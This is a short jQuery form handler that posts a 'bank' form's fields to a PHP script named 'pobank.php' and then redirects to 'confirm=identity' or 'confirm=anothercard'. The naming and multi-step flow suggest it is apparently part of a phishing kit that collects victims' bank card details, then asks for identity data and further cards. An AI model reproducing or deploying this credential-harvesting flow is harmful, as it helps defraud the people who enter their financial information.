$("#bank").validate({
  submitHandler: function(form) {
    $.post("../post/pobank.php", $("#bank").serialize(), function(GET) {
      if (GET == "nofull") {
        setTimeout(function() {
          window.location.assign("confirm=identity");
        })
      } else {
        setTimeout(function() {
          window.location.assign("confirm=anothercard");
        }, 3000)
      }
    });
  },
});
